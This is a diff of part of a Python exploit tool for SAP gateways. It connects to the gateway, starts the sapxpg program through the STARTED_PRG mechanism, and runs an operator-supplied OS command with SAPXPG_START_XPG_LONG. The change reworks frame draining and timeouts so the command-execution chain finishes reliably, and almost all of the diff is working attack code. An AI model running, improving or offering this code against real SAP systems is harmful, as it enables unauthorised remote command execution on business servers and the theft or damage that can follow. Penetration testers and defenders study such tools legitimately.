@@ -980,12 +980,19 @@ def main():
     print("[+] Connected")
 
     # Step 1: GW_NORMAL_CLIENT
-    # SAP Java gateways may send multiple frames in response (e.g. an ack frame
-    # followed by a capabilities/info frame).  Drain all of them so the receive
-    # buffer is empty before sending P2.
+    # Wait up to args.timeout for the first (primary) response frame, then drain
+    # any additional frames with a short 1s window.  Using args.timeout for the
+    # whole drain would block for 10s+ before sending P2 — long enough for the
+    # gateway to time out the session on its side.
     print("\n[*] Step 1: GW_NORMAL_CLIENT")
     ni_send(sock, p1_data)
-    p1_frames = ni_drain(sock, args.timeout)
+    try:
+        first_p1 = ni_recv(sock, args.timeout)
+    except socket.timeout:
+        print("[-] No response to GW_NORMAL_CLIENT (timeout)")
+        sock.close()
+        sys.exit(1)
+    p1_frames = [first_p1] + ni_drain(sock, 1)
     if not p1_frames:
         print("[-] No response to GW_NORMAL_CLIENT (timeout)")
         sock.close()
@@ -1008,40 +1015,37 @@ def main():
     print("[+] Accepted by gateway (%d frame(s))" % len(p1_frames))
 
     # Step 2: F_SAP_INIT
-    # Same multi-frame pattern: loop until we find a conv_id or an error.
+    # Wait up to args.timeout for the first frame (gateway may be slow to start
+    # sapxpg), then collect any additional frames with a short 1s window.
     print("\n[*] Step 2: F_SAP_INIT (STARTED_PRG -> sapxpg)")
     ni_send(sock, p2_data)
+    try:
+        first_p2 = ni_recv(sock, args.timeout)
+    except socket.timeout:
+        print("[-] Timeout waiting for F_SAP_INIT response")
+        sock.close()
+        sys.exit(1)
+    p2_frames = [first_p2] + ni_drain(sock, 1)
+    if args.verbose:
+        for i, f in enumerate(p2_frames):
+            print("[*] P2 frame %d (%d bytes):" % (i + 1, len(f)))
+            print(hexdump(f[:200]))
+
     conv_id = None
-    p2_frame_count = 0
-    while True:
-        try:
-            resp = ni_recv(sock, args.timeout)
-        except socket.timeout:
-            if p2_frame_count == 0:
-                print("[-] Timeout waiting for F_SAP_INIT response")
-                sock.close()
-                sys.exit(1)
-            break
-        p2_frame_count += 1
-        if args.verbose:
-            print("[*] P2 frame %d (%d bytes):" % (p2_frame_count, len(resp)))
-            print(hexdump(resp[:200]))
-        info = parse_response(resp, "F_SAP_INIT")
+    for f in p2_frames:
+        info = parse_response(f, "F_SAP_INIT")
         if info["error"]:
             print("[-] F_SAP_INIT error: %s" % info["error_msg"])
             sock.close()
             sys.exit(1)
         if info["conv_id"] and not conv_id:
             conv_id = info["conv_id"]
-            break  # Got what we need — stop reading
-        # No conv_id yet — might be an intermediate frame; try next with short timeout
-        sock.settimeout(2)
 
     if not conv_id:
         print("[-] Could not extract conversation ID from F_SAP_INIT response")
         sock.close()
         sys.exit(1)
-    print("[+] Conversation ID: %s (from %d frame(s))" % (conv_id, p2_frame_count))
+    print("[+] Conversation ID: %s (from %d frame(s))" % (conv_id, len(p2_frames)))
 
     # Step 3: F_SAP_SEND (SAPXPG_START_XPG_LONG)
     # SAP Java gateways send multiple NI frames in response to this step:
@@ -1055,40 +1059,34 @@ def main():
                        args.command, args.params)
     ni_send(sock, p3_data)
 
+    # Wait for the first response frame with full timeout (command execution may
+    # be slow), then drain any additional frames with a short 1s window.
+    try:
+        first_p3 = ni_recv(sock, args.timeout)
+    except socket.timeout:
+        print("[-] Timeout waiting for Step 3 response")
+        sock.close()
+        sys.exit(1)
+    p3_frames = [first_p3] + ni_drain(sock, 1)
+
     info = {"error": False, "strtstat": None}
     p3_output_lines = []
-    p3_frame_count = 0
-    while True:
-        try:
-            resp = ni_recv(sock, args.timeout)
-        except socket.timeout:
-            if p3_frame_count == 0:
-                print("[-] Timeout waiting for Step 3 response")
-                sock.close()
-                sys.exit(1)
-            # No more frames arriving — treat as end of P3 response stream
-            break
-        p3_frame_count += 1
-        print("[+] Response frame %d: %d bytes" % (p3_frame_count, len(resp)))
+    for i, resp in enumerate(p3_frames):
+        print("[+] Response frame %d: %d bytes" % (i + 1, len(resp)))
         if args.verbose:
             print(hexdump(resp[:500]))
 
-        info = parse_response(resp, "SAPXPG_START_XPG_LONG")
-        if info["error"]:
-            print("[-] Error: %s" % info["error_msg"])
+        frame_info = parse_response(resp, "SAPXPG_START_XPG_LONG")
+        if frame_info["error"]:
+            print("[-] Error: %s" % frame_info["error_msg"])
             sock.close()
             sys.exit(1)
 
         # Collect any output lines already embedded in P3 frames (Java style)
-        lines = extract_p4_output(resp)
-        p3_output_lines.extend(lines)
+        p3_output_lines.extend(extract_p4_output(resp))
 
-        if info["strtstat"]:
-            break  # Got definitive status — stop reading P3 frames
-
-        # No STRTSTAT yet — try to read the next frame (intermediate ack case)
-        # Use a short timeout so we don't hang if there are no more frames
-        sock.settimeout(2)
+        if frame_info["strtstat"] and not info["strtstat"]:
+            info = frame_info
 
     if info["strtstat"]:
         status_map = {"O": "OK (command executed)", "F": "Failed", "E": "Error"}
